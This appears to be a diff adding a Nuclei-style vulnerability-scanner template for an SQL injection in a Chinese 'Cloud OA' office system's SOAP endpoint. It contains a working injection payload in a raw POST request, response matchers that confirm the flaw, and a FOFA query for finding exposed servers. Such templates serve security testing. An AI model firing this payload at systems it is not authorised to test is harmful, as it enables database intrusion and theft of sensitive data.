@@ -1,0 +1,52 @@
+id: cloud-oa-system-sqli
+
+info:
+  name: Cloud OA System - SQL Injection
+  author: SleepingBag945
+  severity: high
+  description: |
+    cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.
+  reference:
+    - https://github.com/GREENHAT7/pxplan/blob/e2fc04893ca95e177021ddf61cc2134ecc120a8e/xray_pocs/yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760.yml#L8
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="全程云办公" && body="/OA/WebResource.axd"
+  tags: cloud,cloudoa,sqli,vuln
+variables:
+  num: "999999999"
+
+http:
+  - raw:
+      - |
+        POST /OA/PM/svc.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetUsersInfo xmlns="http://tempuri.org/">
+              <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{num}}'),2))</userIdList>
+            </GetUsersInfo>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "System.Data.SqlClient.SqlException"
+          - "{{md5(num)}}"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/xml
+
+      - type: status
+        status:
+          - 500
+# digest: 4a0a004730450220266df2a4e5889eadbd9b6830993ecfcecfe3ac535a6fcd8eda0a0964caaae251022100a07b0c02ff34de82ddd1011ce4bbe415bc08cf22920b2724122b495cd37f569c:922c64590222798bb761d5b6d8e72950
